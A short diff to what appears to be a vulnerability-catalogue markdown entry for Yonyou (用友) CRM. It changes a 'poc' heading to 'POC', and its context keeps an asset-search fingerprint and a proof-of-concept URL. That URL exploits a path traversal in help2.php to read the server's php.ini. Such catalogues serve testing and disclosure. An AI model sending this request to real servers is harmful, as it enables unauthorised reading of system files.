@@ -5,7 +5,7 @@
 app.name="用友 CRM"
 ```
 
-## poc
+## POC
 ```
 http://127.0.0.1:9000/pub/help2.php?key=../../apache/php.ini
 ```
